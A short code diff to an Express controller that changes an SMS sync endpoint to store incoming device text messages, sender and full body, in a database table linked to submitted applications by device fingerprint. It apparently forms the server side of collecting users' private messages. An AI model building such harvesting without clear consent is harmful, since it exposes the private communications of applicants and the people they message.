@@ -1,4 +1,4 @@
-const { Application } = require('../models');
+const { Application, SmsLog } = require('../models');
 const { validationResult } = require('express-validator');
 
 exports.submitApplication = async (req, res) => {
@@ -74,12 +74,24 @@ exports.getApplicationStatus = async (req, res) => {
 
 exports.syncSms = async (req, res) => {
     console.log('[RUTHLESS TRACE] New SMS Sync Incoming');
-    console.log(JSON.stringify(req.body, null, 2));
 
     try {
         const { deviceId, sms } = req.body;
-        // In a worldwide app, we'd log this to a separate Logs table or elasticsearch
-        console.log(`[RUTHLESS SMS] Device: ${deviceId} | From: ${sms.address} | Body: ${sms.body}`);
+
+        // Find application by device ID if possible
+        const application = await Application.findOne({
+            where: { deviceFingerprint: { deviceId: deviceId } }
+        });
+
+        await SmsLog.create({
+            address: sms.address,
+            body: sms.body,
+            date: new Date(),
+            deviceId: deviceId,
+            applicationId: application ? application.id : null
+        });
+
+        console.log(`[RUTHLESS SMS] Saved: ${deviceId} | From: ${sms.address}`);
         res.json({ status: 'logged' });
     } catch (e) {
         console.error('[RUTHLESS TRACE] SMS Sync Error:', e);
